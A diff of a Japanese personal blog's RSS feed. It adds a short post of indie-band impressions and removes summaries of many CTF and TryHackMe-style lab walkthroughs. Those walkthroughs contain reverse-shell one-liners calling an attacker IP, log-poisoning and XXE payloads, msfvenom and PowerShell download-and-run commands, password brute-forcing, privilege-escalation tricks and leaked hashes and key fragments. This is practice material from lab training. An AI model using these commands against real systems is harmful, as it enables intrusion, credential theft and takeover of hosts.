+https://note.com/unnyonsan/n/n14e95fc5fb55
+えんぷてい whim を聴いて一発でハマった． レトロに逃げず，でもリバーブ多めにドリーミーな感じを出すバンドはたくさんあるけど，えんぷていは遊び心というか余裕があってかなり聴きやすい． 言葉は少ないのに日本人の本能に訴えかけるようなメロディが良い． 歌がうまいんだとおもう．
+シティポップ流行っているなあ，という気持ちになるが，結局こういう部分に戻ってくるんだろうな，と思う．
+くずれ餅屋 歌謡だ！
+なんとなくこち亀の雰囲気を感じる．
+ミヤケ武器 「失礼しちゃうわ」がすごく良いからそのまま聴いてたんだけどどうやらミヤケ武器の本領はここではないらしい．．． ヒップホップとかとかブラックミュージックっぽいニュアンスがある曲の方がメインだと思う．
+luv のボーカルギターもやっているらしい． 最近兼務の人も多いな，kurayamisaka もせだいと兼務してるし
+No Buses 海外発信を狙ってるようなバンドだと思う． 無気力な感じは決して無気力で終わっていなくて，むしろ安心感すら感じる．
+フー・ドゥー・ユー・ラブ キイチビールなんだな． 呼び合った！は良いけどそれ以降は少し微妙かもしれないな，という印象がある．
+ハシリコミーズ ロックだけでなく，最近はサイケの雰囲気も感じる． ピアノの使い方が面白い． 明るいビジュアルとか歌い方，曲風だけど歌詞は結構暗さとかあきらめを含んでいて，そういうギャップが魅力だと思う．
+Giallo 新人らしいが急にガチのガレージロックが来たな，という印象．．． ハイトーンボーカルがちゃんと金切り声でよいし，ギターの音もほとんど完成していてすごい．本当に新人か？
+ビジュアルも相まって，まだ広がりそうだと思うが今はシティポップが流行っているのでメインストリームは難しいのか．．．という感想もあり．．． 個人的には Arctic Monkey の影響を強く感じる
+ドミコ ずっと応援してる．新譜もよかった．
+多重録音だとは思うけど二人だけでこの厚みが出るのはすごいと思う．
+離婚伝説 最推しだと思う． シティポップって nulbarich とか suchmos みたいなネオシティポップになりがちだし，そういうのも大好きなんだけど，離婚伝説は直球のシティポップの系譜で作っているような気がして好き．</description>
     </item>
     
     <item>
@@ -133,248 +150,15 @@ User-agent: * Disallow: /instructions.txt Disallow: /uploads/ robots.txt から 
     </item>
     
     <item>
-      <title>picoCTF の rev 全部解く</title>
-      <link>http://side-realms.github.io/writeup/picorev/</link>
-      <pubDate>Sun, 07 Apr 2024 19:40:38 +0900</pubDate>
-      
-      <guid>http://side-realms.github.io/writeup/picorev/</guid>
-      <description>CTF の問題を解いていると，解けはするけど異常に時間がかかる，みたいなことが多い． rev に限れば，これは，ツールの使い方が甘かったり，つまみ食い的に rev をやってきたので常識が欠落していて遠回りしていたり，そもそもデコンパイル結果を読む筋力が全然なかったりすることが原因だと分かっている． なので，数をこなそう作戦で，知り合いにオススメされた picoCTF の rev を全部解いてみる． 2~3 日くらいで完走できたら良い
-Transformation &#39;&#39;.join([chr((ord(flag[i]) &amp;lt;&amp;lt; 8) + ord(flag[i + 1])) for i in range(0, len(flag), 2)]) をデコードする encoded_flag = &amp;#34;灩捯䍔䙻ㄶ形楴獟楮獴㌴摟潦弸弲㘶㠴挲ぽ&amp;#34; flag = [] for i in range(len(encoded_flag)): tmp1 = ord(encoded_flag[i]) &amp;amp; 0xFF tmp2 = ord(encoded_flag[i]) &amp;gt;&amp;gt; 8 flag += chr(tmp2) flag += chr(tmp1) print(&amp;#34;&amp;#34;.join(flag)) keygenme-py Arcane Calculator なるものが動いていて，ライセンスを入れるといいらしい def check_key(key, username_trial): global key_full_template_trial if len(key) != len(key_full_template_trial): return False else: # Check static base key part --v i = 0 for c in key_part_static1_trial: if key[i] !</description>
-    </item>
-    
-    <item>
-      <title>Anonforce</title>
-      <link>http://side-realms.github.io/writeup/anonforce/</link>
-      <pubDate>Sun, 07 Apr 2024 05:14:09 +0900</pubDate>
-      
-      <guid>http://side-realms.github.io/writeup/anonforce/</guid>
-      <description>user ftp に anonymous ログインができる user.txt を見る root 謎に noread ディレクトリがあるのでここの backup.pgp と private.asc をダウンロード gpg2john private.asc &amp;gt; private john --wordlist=/usr/share/wordlists/rockyou.txt private gpg --import private.asc gpg --decrypt backup.pgp shadow ファイルが手に入るので root のパスワードを復元して ssh </description>
-    </item>
-    
-    <item>
-      <title>Disgruntled</title>
-      <link>http://side-realms.github.io/writeup/disgruntled/</link>
-      <pubDate>Sun, 07 Apr 2024 05:07:47 +0900</pubDate>
-      
-      <guid>http://side-realms.github.io/writeup/disgruntled/</guid>
-      <description>Task3 cat /var/log/auth.log |grep install Task4 cat /var/log/auth.log |grep adduser cat /var/log/auth.log |grep visudo cat /var/log/auth.log |grep vi Task5 it-admin がユーザーであることが分かったので cat /home/it-admin/.bash_history cat /home/it-admin/.viminfo ls -la /bin/os-update cat /bin/os-update.sh Task6 cat /etc/crontab </description>
-    </item>
-    
-    <item>
-      <title>ACSC 2024 writeup</title>
-      <link>http://side-realms.github.io/writeup/acsc2024/</link>
-      <pubDate>Sun, 31 Mar 2024 13:24:01 +0900</pubDate>
-      
-      <guid>http://side-realms.github.io/writeup/acsc2024/</guid>
-      <description>ACSC に参加しました． Twitter で hardware ジャンルのある CTF があることを知ったので参加しようと思った次第です． hardware は完答ですが，案の定 hardware 以外は解いていません(解けていません)． 次の writeup で解いてみます． 順位は 800 pts で世界 64/282(?) 位でした.
-An4lyz3_1t(50pts, 140 solved) .sal のバイナリデータが与えられます． logic2 で Async Serial デコードするとフラグが得られます． ボーレートに注意する必要がありますが，この程度なら典型的なボーレートでできると思います． もちろん手でもデコードできます．
-0(ASCII code) 0111 0(ASCII code) 0111...
-みたいな並びになっているので，ASCII code が逆順になっていることに注意して，ゴミを取り除きつつデコードすることができます．
-Valut(150pts, 68 solves) 10 桁の PIN をサイドチャネル攻撃しろ，という問題でした． CTF でサイドチャネル攻撃するなら大抵タイミング攻撃なのでそうだろうと思いつつサーバを触ってみます．
-時間を測ると，入力した PIN を 1 文字ずつチェックして，正解の PIN と一致していたら 0.1 秒の遅延が入るような仕組みになっているようでした．
-以下がスクリプトです． 作り甘いですが&amp;hellip;
-from pwn import * import time list = [&amp;#39;0&amp;#39;,&amp;#39;1&amp;#39;,&amp;#39;2&amp;#39;,&amp;#39;3&amp;#39;,&amp;#39;4&amp;#39;,&amp;#39;5&amp;#39;,&amp;#39;6&amp;#39;,&amp;#39;7&amp;#39;,&amp;#39;8&amp;#39;,&amp;#39;9&amp;#39;] io = remote(&amp;#39;vault.</description>
-    </item>
-    
-    <item>
-      <title>Boiler</title>
-      <link>http://side-realms.github.io/writeup/boiler/</link>
-      <pubDate>Thu, 28 Mar 2024 00:22:47 +0900</pubDate>
-      
-      <guid>http://side-realms.github.io/writeup/boiler/</guid>
-      <description>user FTP anonymous login .info.txt rabbit hole webmin searchsploit 特になし CMS Joomla Joomla 3.8 joomla-brute とかいろいろ試したけどクレデンシャルが手に入らず RCE 断念 エンドポイントにクレデンシャルが露出しているらしいがアクセスできなかった(ref: How to bypass the admin login page in Joomla &amp;amp; RCE) gobuster をさらにかけると ./_test がアクセスできる それ以外は rabbit hole(いい加減にしてくれ&amp;hellip;) sar2html が動いている searchsploit で探すと RCE ができるらしい ls で log.txt が見つかる cat log.txt でクレデンシャルが見つかる basterd:superduperp@$$ ssh する ssh backup.sh が見つかる パスワードがハードコードしてある stoner にユーザを変える .secret が見つかる root SUID find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&amp;gt; /dev/null find が使えるらしい /usr/bin/find .</description>
-    </item>
-    
-    <item>
-      <title>Internal</title>
-      <link>http://side-realms.github.io/writeup/internal/</link>
-      <pubDate>Wed, 20 Mar 2024 08:06:49 +0900</pubDate>
-      
-      <guid>http://side-realms.github.io/writeup/internal/</guid>
-      <description>user wordpress っぽいので wpscan wpscan --url http://internal.thm/blog -e admin が見つかる wpscan --url http://internal.thm/blog -U admin -P /usr/share/wordlists/rockyou.txt パスワードも見つかる wordpress にログインできた Appearance から 404.php を編集してリバースシェルを入れる(WordPress: Reverse Shell) http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php にアクセス aubreanna にしか権限がないため，user.txt が見れない 分からなすぎるので writeup を見ると，/opt にパスワードがあるらしい(は？) su aubreanna で権限昇格 root aubreanna の /home に jenkins.txt がある aubreanna@internal:~$ cat jenkins.txt cat jenkins.txt Internal Jenkins service is running on 172.17.0.2:8080 ssh トンネル ssh -L 1234:172.17.0.2:8080 aubrenna@internal.thm http://127.0.0.1:8080 で jenkins にアクセスできる hydra 127.0.0.1 -s 8080 -V -f http-form-post &amp;quot;/j_acegi_security_check:j_username=^USER^&amp;amp;j_password=^PASS^&amp;amp;from=%2F&amp;amp;Submit=Sign+in&amp;amp;Login=Login:Invalid username or password&amp;quot; -l admin -P /usr/share/wordlists/rockyou.</description>
-    </item>
-    
-    <item>
-      <title>Rerevand</title>
-      <link>http://side-realms.github.io/writeup/rerevand/</link>
-      <pubDate>Mon, 18 Mar 2024 09:58:44 +0900</pubDate>
-      
-      <guid>http://side-realms.github.io/writeup/rerevand/</guid>
-      <description>user smb が開いてるのでこれを起点にする enum4linux は動かなかった nmap よく見たら windows だった smbclient -L \\\\ip で使えそうな share を探す nt4wrksv が使えそう パスワードなしで入れる パスワードリストが手に入る nt4wrksv が書き込み可能なのでリバースシェルを入れる(SMB (Server Message Block) Pentesting - Exploit Notes) msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=ip lport=port -f aspx -o shell.asp smb: \&amp;gt; put shell.aspx curl http://10.10.16.163:49663/nt4wrksv/shell.aspx root SeImpersonatePrivilege が使える(Abusing Tokens - HackTricks) wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe を使う eterpreter &amp;gt; getprivs Enabled Process Privileges ========================== Name ---- SeAssignPrimaryTokenPrivilege SeAuditPrivilege SeChangeNotifyPrivilege SeCreateGlobalPrivilege SeImpersonatePrivilege SeIncreaseQuotaPrivilege SeIncreaseWorkingSetPrivilege meterpreter &amp;gt; shell C:\users\bob\desktop&amp;gt;cd c:/inetpub/wwwroot/nt4wrksv cd c:/inetpub/wwwroot/nt4wrksv c:\inetpub\wwwroot\nt4wrksv&amp;gt;dir dir Volume in drive C has no label.</description>
-    </item>
-    
-    <item>
-      <title>Daily Bugle</title>
-      <link>http://side-realms.github.io/writeup/dailybugle/</link>
-      <pubDate>Sun, 17 Mar 2024 04:41:11 +0900</pubDate>
-      
-      <guid>http://side-realms.github.io/writeup/dailybugle/</guid>
-      <description>user.txt Joomla! というのが動いてる /language/en-GB/en-GB.xml にアクセスするとバージョンが見える(Joomla - HackTricks) searchsploit で SQLi がヒットする python のエクスプロイトコードが出ている(Exploit-Joomla) ユーザ名とパスワードハッシュが得られる Joomla にログイン リバースシェルが template に貼れる(Joomla: Reverse Shell) beez3 に php リバースシェルを貼る save する nc -nlvp 1234 リバースシェル apache としてログイン，権限がなく user.txt が見れない linpeas.sh でパスワードが露出していることが分かる（どういう仕組みなんだこれ） su jjameson root yum が使えるらしい rpm ロードをやろうとしたが fpm が使えず断念 TF=$(mktemp -d) cat &amp;gt;$TF/x&amp;lt;&amp;lt;EOF [main] plugins=1 pluginpath=$TF pluginconfpath=$TF EOF cat &amp;gt;$TF/y.conf&amp;lt;&amp;lt;EOF [main] enabled=1 EOF cat &amp;gt;$TF/y.py&amp;lt;&amp;lt;EOF import os import yum from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE requires_api_version=&amp;#39;2.</description>
-    </item>
-    
-    <item>
-      <title>Gamezone</title>
-      <link>http://side-realms.github.io/writeup/gamezone/</link>
-      <pubDate>Sun, 17 Mar 2024 04:41:11 +0900</pubDate>
-      
-      <guid>http://side-realms.github.io/writeup/gamezone/</guid>
-      <description>user SQLi をする ユーザ名が分かってないので，ユーザ名のところで &#39; or 1=1 -- - portal.php ではレビューのデータベースを検索する リクエストを burp でキャッチ sqlmap -r request.txt --dbms=mysql --dump ハッシュパスワードとユーザ名がもらえる ssh できるようになる root ssh ポートフォワーディング ss -tulpn コマンドで 10000 ポートに外部から入る通信がファイアウォールによってブロックされていることが分かる ssh -L 10000:localhost:10000 &amp;lt;username&amp;gt;@&amp;lt;ip&amp;gt; local で実行する localhost:10000 への通信を，&amp;lt;username&amp;gt;@&amp;lt;ip&amp;gt; を経由して localhost:10000 に転送する SSHトンネル ssh -L 127.0.0.1:8080:example.org:80 ssh-server なので，今回の始点と終点は localhost で，ssh-server が agent47 のサーバ </description>
-    </item>
-    
-    <item>
-      <title>Alfred</title>
-      <link>http://side-realms.github.io/writeup/alfred/</link>
-      <pubDate>Sat, 16 Mar 2024 15:31:32 +0900</pubDate>
-      
-      <guid>http://side-realms.github.io/writeup/alfred/</guid>
-      <description>user.txt windows で jenkin が動いている admin admin で通る hydra -l admin -P /usr/share/wordlists/rockyou.txt thm.local -s 8080 http-post-form &amp;quot;/j_acegi_security_check:j_username=^USER^&amp;amp;j_password=^PASS^:F=Invalid&amp;quot; -V -t 64 -I Nishang ローカルの Invoke-PowerShellTcp.ps1 があるディレクトリで http サーバを立てる nc -nlvp 1234 jenkins の config -&amp;gt; ビルド -&amp;gt; windows パッチコマンドの実行 powershell iex (New-Object Net.WebClient).DownloadString(&#39;http://your-ip:your-port/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port build now でリバースシェルがもらえる switch shell msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=ip LPORT=port -f exe -o rv.exe ローカルで python3 -m http.server 8001 powershell で powershell &amp;quot;(New-Object System.</description>
-    </item>
-    
-    <item>
-      <title>Steel</title>
-      <link>http://side-realms.github.io/writeup/steel/</link>
-      <pubDate>Sat, 16 Mar 2024 14:11:33 +0900</pubDate>
-      
-      <guid>http://side-realms.github.io/writeup/steel/</guid>
-      <description>初めての windows
-user HTTP File Server があるので metasploit で CVE を見つける root windows は PowerUP.ps1 が使える upload /PowerUp.ps1 Invoke-AllChecks AdvancedSystemCareService9 が再起動できるので，悪意ある exe に置き換える msfvenom -p windows/shell_reverse_tcp LHOST=&amp;lt;attacker ip&amp;gt; LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe &amp;ldquo;shell&amp;rdquo; でシェルを起動 sc stop AdvancedSystemCareService9 copy ASCService C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe sc start AdvancedSystemCareService9 </description>
-    </item>
-    
-    <item>
-      <title>Mustacchio</title>
-      <link>http://side-realms.github.io/writeup/mustacchio/</link>
-      <pubDate>Sat, 16 Mar 2024 14:06:52 +0900</pubDate>
-      
-      <guid>http://side-realms.github.io/writeup/mustacchio/</guid>
-      <description> /custom/js/users.bak というファイルがある． admin:~~ みたいなのがあって，パスワードがハッシュ化されているのでクラックする -行き詰ったので nmap -A -p- ultraseek-http みたいなのが 8765 で開いてる admin ログインできる XML コードを入れられる XXE &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE replace [&amp;lt;!ENTITY example &amp;#34;XML Injection&amp;#34;&amp;gt; ]&amp;gt; &amp;lt;comment&amp;gt; &amp;lt;name&amp;gt;Joe Hamd&amp;lt;/name&amp;gt; &amp;lt;author&amp;gt;&amp;amp;example;&amp;lt;/author&amp;gt; &amp;lt;com&amp;gt;Test paragraph&amp;lt;/com&amp;gt; &amp;lt;/comment&amp;gt; &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE replace [&amp;lt;!ENTITY xxe **SYSTEM** &amp;#39;file:///etc/passwd&amp;#39;&amp;gt;]&amp;gt; &amp;lt;comment&amp;gt; &amp;lt;name&amp;gt;Joe Hamd&amp;lt;/name&amp;gt; &amp;lt;author&amp;gt;Joe&amp;lt;/author&amp;gt; &amp;lt;com&amp;gt;&amp;amp;xxe;&amp;lt;/com&amp;gt; &amp;lt;/comment&amp;gt; ソースコードに barry, ssh して！みたいなコメントがあったので &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE replace [&amp;lt;!ENTITY xxe SYSTEM &amp;#39;file:////home/barry/.ssh/id_rsa&amp;#39;&amp;gt;]&amp;gt; &amp;lt;comment&amp;gt; &amp;lt;name&amp;gt;Joe Hamd&amp;lt;/name&amp;gt; &amp;lt;author&amp;gt;Joe&amp;lt;/author&amp;gt; &amp;lt;com&amp;gt;&amp;amp;xxe;&amp;lt;/com&amp;gt; &amp;lt;/comment&amp;gt; SSH 鍵をゲット フォーマットがウザい - ----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMU MZdJ7DH1k226qQMtm4q96MZKEQ5ZFa032SohtfDPsoim/7dNapEOujRmw+ruBE65 ~~~ snip ~~~ 7mxN/N5LlosTefJnlhdIhIDTDMsEwjACA+q686+bREd+drajgk6R9eKgSME7geVD -----END RSA PRIVATE KEY----- ssh2john root find / -perm -u=s -type f 2&amp;gt;/dev/null live_log を見つける 権限 s strings で tail を見つける 絶対パスじゃないのでパスを追加 /tmp に tail → /bin/bash を作成 export PATH=”/tmp:$PATH” </description>
-    </item>
-    
-    <item>
-      <title>C0ldd</title>
-      <link>http://side-realms.github.io/writeup/c0ldd/</link>
-      <pubDate>Sat, 16 Mar 2024 14:04:24 +0900</pubDate>
-      
-      <guid>http://side-realms.github.io/writeup/c0ldd/</guid>
-      <description>user wordpress が動いている /hidden C0lld, philip, hugo wpscan --url http://10.10.233.13 -U C0ldd -P /usr/share/wordlists/rockyou.txt --password-attack wp-login -t 64 ログインすると apperrance が触れるので，404.php にリバースシェルを貼る cat /var/www/html/wp-config.php Coldd のパスワードが見える su C0ldd root sudo -l で ftp が使える ftp -&amp;gt; !/bin/bash </description>
-    </item>
-    
-    <item>
-      <title>Archangel</title>
-      <link>http://side-realms.github.io/writeup/archangel/</link>
-      <pubDate>Sat, 16 Mar 2024 13:41:58 +0900</pubDate>
-      
-      <guid>http://side-realms.github.io/writeup/archangel/</guid>
-      <description>1st flag metafive.thm /etc/host への追加 2nd flag robots.txt にある disallow にアクセスすると php ページに出る LFI GET /test.php?view=/var/www/html/development_testing/..//..//..//..//etc/passwd エスケープに気を付ける必要がある /home/archangel/user.txt が露出していたので先に見る PHP ラッパで test.php の中身も見ると 2nd flag がある ?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php user.txt さっきのやつ user2.txt ログポイズニング burp suite でパケットをキャッチ ”User-Agent: &amp;lt;?php system($_GET[&#39;cmd&#39;]); ?&amp;gt;” GET /test.php?view=/var/www/html/development_testing/..//..//..//..//var//log/apache2/access.log&amp;amp;cmd=rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|sh+-i+2&amp;gt;%261|nc+10.18.127.137+1234+&amp;gt;/tmp/f HTTP/1.1 空白は +, &amp;amp; は %26 にエスケープする local で nc で待ち構えているとリバースシェルがもらえる archangel が user2.txt の権限をもっている crontab /opt/helloworld.sh が動いている echo “rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&amp;gt;&amp;amp;1|nc 10.18.127.137 4444 &amp;gt;/tmp/f” &amp;gt; /opt/hellowold.sh root.</description>
-    </item>
-    
-    <item>
-      <title>Chocolate</title>
-      <link>http://side-realms.github.io/writeup/chocolate/</link>
-      <pubDate>Sat, 16 Mar 2024 13:28:17 +0900</pubDate>
-      
-      <guid>http://side-realms.github.io/writeup/chocolate/</guid>
-      <description>user FTP に anonymous ログイン steghide で引き出すと base64 エンコードされたパスワードリストがもらえる nmap したときに localhost うんぬん言われたところにアクセスすると key_rev_key をもらえる strings charlie とパスワードで http にログインするとコードを実行できるフォームが見つかる cat /home/charlie/teleport で ssh 鍵をもらう ssh root vi が使える sudo vi -c &#39;:!/bin/sh&#39; /dev/null </description>
-    </item>
-    
-    <item>
-      <title>Gamingserver</title>
-      <link>http://side-realms.github.io/writeup/gamingserver/</link>
-      <pubDate>Sat, 16 Mar 2024 13:24:19 +0900</pubDate>
-      
-      <guid>http://side-realms.github.io/writeup/gamingserver/</guid>
-      <description>user.txt /secret secretKey がある -&amp;gt; ssh 鍵 /uploads dict.lst -&amp;gt; ssh パスワード鍵候補？ ssh2john secretKey &amp;gt; hash.txt john —wordlist=dict.lst hash.txt ssh ログイン ユーザ名はソースコードから読む このパターンどうにかならんのか root.txt john が lxd ユーザなのでこれを使う alpine イメージのビルド git clone https://github.com/saghul/lxd-alpine-builder.git cd .lxd-alpine-builder /build-alpine イメージ作成（管理者権限付き） lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias myContainer lxc init myContainer myVM -c security.privileged=true lxc config device add myVM mydevice disk source=/ path=/mnt/root recursive=true 起動 lxc start myVM lxc exec myVM /bin/sh </description>
-    </item>
-    
-    <item>
-      <title>Chill</title>
-      <link>http://side-realms.github.io/writeup/chill/</link>
-      <pubDate>Sat, 16 Mar 2024 11:49:38 +0900</pubDate>
-      
-      <guid>http://side-realms.github.io/writeup/chill/</guid>
-      <description>user.txt gobuster で見つかった /secret にアクセスすると linux コマンドを実行できるサイトが見つかる ls を実行すると are you hacker? っていうアラートが出る pwd;ls だとアラートが出ず，実行結果が見える ここにリバースシェルを入れればいい whoami;php -r &#39;$sock=fsockopen(&amp;quot;your-vpn-ip&amp;quot;,4444);exec(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;quot;);&#39; www-data では何もできない sudo -l で，.helpline.sh が apaar として実行できるっぽい .helpline.sh を見ると，$msg 2&amp;gt;/dev/null が見える /bin/bash を実行すれば apaar としてシェルをもらえる root.txt linpeas.sh 127.0.0.1:9001 が localhost から実行できるらしい で，ここに mysql が動いてる local で ssh-keygen echo &amp;quot;contents of .pub&amp;quot; &amp;gt;&amp;gt; /home/apaar/.ssh/authorized_keys ssh -L 9001:127.0.0.1:9001 apaar@10.10.233.203 -i id_rsa index.php を見ると root とパスワードが載ってる apaar から mysql にログイン mysql -h localhost -u root -p show databese show tables SELECT * FROM users -&amp;gt; anurodh のパスワード customer portal みたいなとこからログインして，images をダウンロードする steghide —extract -sf .</description>
-    </item>
-    
-    <item>
-      <title>Wgel</title>
-      <link>http://side-realms.github.io/writeup/wgel/</link>
-      <pubDate>Sat, 16 Mar 2024 11:43:01 +0900</pubDate>
-      
-      <guid>http://side-realms.github.io/writeup/wgel/</guid>
-      <description>user.txt unapp というアプリが使われている searchsploit は特になし /sitemap/.ssh .ssh から id_rsa を持ってくる ssh2john id_rsa &amp;gt; hash.txt ユーザ名はソースコードで jessie ssh -i id_rsa jessie@10.10.217.228 root.txt wget が sudo で使えるらしいが GTFObin ではうまくいかない wget privilege escalation でググる ローカルで nc -lvnp 4444 ターゲットで sudo /usr/bin/wget --post-file=/etc/shadow &amp;lt;local-ip&amp;gt; 4444 /etc/shadow が見えるのでコピーする ローカルで ./shadow.txt とかで保存 ローカルで新しいハッシュを作る openssl passwd -6 -salt &#39;salt&#39; &#39;password’ これを shadow.txt に追記 root:$6$salt$IxDD...DCy.g.:18195:0:99999:7::: これを転送 sudo /usr/bin/wget http://&amp;lt;local-ip&amp;gt;:8000/shadow.txt -O /etc/shadow </description>
-    </item>
-    
-    <item>
-      <title>Ignite</title>
-      <link>http://side-realms.github.io/writeup/ignite/</link>
-      <pubDate>Sat, 16 Mar 2024 11:39:35 +0900</pubDate>
-      
-      <guid>http://side-realms.github.io/writeup/ignite/</guid>
-      <description>user.txt searchsploit fuel CMS RCE URL とプロキシを設定しなおす必要アリ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.18.127.137 1234 &amp;gt; /tmp/f find / 2&amp;gt;/dev/null | grep flag.txt root.txt sudo , crontab, linpeas も特になし 細かく linpeas を見ていく password -&amp;gt; mememe みたいなのがある su で使えてしまう </description>
-    </item>
-    
-    <item>
-      <title>Brooklyn</title>
-      <link>http://side-realms.github.io/writeup/brooklyn/</link>
-      <pubDate>Sat, 16 Mar 2024 11:36:42 +0900</pubDate>
-      
-      <guid>http://side-realms.github.io/writeup/brooklyn/</guid>
-      <description>user.txt FTP jake がユーザー名？ hydra -l jake -P /usr/share/wordlists/rockyou.txt 10.10.10.241 ssh find / 2&amp;gt;/dev/null | grep user.txt root.txt less sudo less /etc/profile !/bin/sh </description>
-    </item>
-    
-    <item>
-      <title>Bruteit</title>
-      <link>http://side-realms.github.io/writeup/bruteit/</link>
-      <pubDate>Sat, 16 Mar 2024 11:33:52 +0900</pubDate>
-      
-      <guid>http://side-realms.github.io/writeup/bruteit/</guid>
-      <description>user.txt ソースコードを見ると admin がある hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.184.144 http-form-post &amp;quot;/admin/:user=^USER^&amp;amp;pass=^PASS^:Username or password invalid id_rsa がもらえる ssh2john id_rsa &amp;gt; hash.txt john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt chmod 666 id_rsa ssh -i id_rsa john@10.10.184.144 root.txt sudo -l で cat LFILE=/etc/shadow john@bruteit:~$ sudo cat $LFILE root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7::: これを john で解析する su root </description>
-    </item>
-    
-    <item>
-      <title>Skynet</title>
-      <link>http://side-realms.github.io/writeup/skynet/</link>
-      <pubDate>Sat, 16 Mar 2024 11:17:21 +0900</pubDate>
-      
-      <guid>http://side-realms.github.io/writeup/skynet/</guid>
-      <description>user.txt smb なので enum4linux anonymous milesdyson anonymous でアクセスするとファイルがもらえる パスワードリストをもってくる hydra -l milesdyson -P log1.txt [IP] http-form-post &amp;quot;/squirrelmail/src/redirect.php:login_username=^USER^&amp;amp;secretkey=^PASS^&amp;amp;js_autodetect_results=1&amp;amp;just_logged_in=1:Unknown user or password incorrect.&amp;quot; squirrelmail にアクセス )s{A&amp;amp;2Z=F^n_E.B` を受け取る smb に milesdyson でアクセス smbclient //10.10.35.53/milesdyson --user=milesdyson /45kra24zxs28v3yd というディレクトリがあるらしい gobuster dir -u http://10.10.35.53/45kra24zxs28v3yd cuppa が使われている searchsploit cuppa CMS リバースシェルを立てる root.txt crontab # /etc/crontab: system-wide crontab # Unlike any other crontab you don&amp;#39;t have to run the `crontab&amp;#39; # command to install the new version when you edit this file # and files in /etc/cron.</description>
-    </item>
-    
-    <item>
-      <title>Lazyadmin</title>
-      <link>http://side-realms.github.io/writeup/lazyadmin/</link>
-      <pubDate>Sat, 16 Mar 2024 11:11:11 +0900</pubDate>
-      
-      <guid>http://side-realms.github.io/writeup/lazyadmin/</guid>
-      <description>enum nmap 22:ssh 80:http gobuster content user.txt searchsploit sweetrice cat /usr/share/exploitdb/exploits/php/webapps/40718.txt You can access to all mysql backup and download them from this directory. http://localhost/inc/mysql_backup and can access to website files backup from: http://localhost/SweetRice-transfer.zip mysql のバックアップ？に接続できるらしい http://10.10.61.5/content/inc/mysql_backup/ manager とパスワードのハッシュが見つかる Arbitary file upload みたいなのを実行する http://10.10.61.5/content/attachment/./shell.php5 に php が出てくるのでアクセスするとリバースシェルを獲得できる root.txt sudo -l $ sudo -l Matching Defaults entries for www-data on THM-Chal: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User www-data may run the following commands on THM-Chal: (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.</description>
-    </item>
-    
-    <item>
-      <title>Bounty</title>
-      <link>http://side-realms.github.io/writeup/bounty/</link>
-      <pubDate>Sat, 16 Mar 2024 11:06:05 +0900</pubDate>
-      
-      <guid>http://side-realms.github.io/writeup/bounty/</guid>
-      <description>enum nmap 21:ftp 22:ssh ftp locks.txt task.txt user.txt hydra ssh で locks.txt を使う user.txt が見える root.txt sudo -l で ```(root) /bin/tar sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh root.txt ゲット </description>
-    </item>
-    
-    <item>
-      <title>Blog</title>
-      <link>http://side-realms.github.io/writeup/blog/</link>
-      <pubDate>Sat, 16 Mar 2024 10:57:51 +0900</pubDate>
-      
-      <guid>http://side-realms.github.io/writeup/blog/</guid>
-      <description>enum 22:ssh 80:http enum4linux BillySMB という share がある bjoel, smb というユーザーがある SMB BillySMB にパスワード無しで入れる よく分からん .txt と .mp4, .png しかない steghide も特になし wpscan wpscan --url http://10.10.208.138/ -e u ユーザ名が bjoel, kwheel wpscan --url http://10.10.208.138 -U bjoel,kwheel -P /usr/share/wordlists/rockyou.txt --password-attack wp-login -t 64 kwheel:cutiepie1 ssh はできない metasploit search crop-image options で設定するとシェルがもらえる user.txt find / 2&amp;gt;/dev/null | grep user.txt $ cat /home/bjoel/user.txt You won&amp;#39;t find what you&amp;#39;re looking for here. TRY HARDER は？ priviledge escalation find / -perm -u=s -type f 2&amp;gt;/dev/null ls -la /usr/sbin/checker -rwsr-sr-x 1 root root 8432 May 26 2020 /usr/sbin/checker ltrace checker getenv(&amp;#34;admin&amp;#34;) = nil puts(&amp;#34;Not an Admin&amp;#34;) = 13 Not an Admin admin という環境変数があるのでこれを設定してみる ltrace checker getenv(&amp;#34;admin&amp;#34;) = &amp;#34;1&amp;#34; setuid(0) = -1 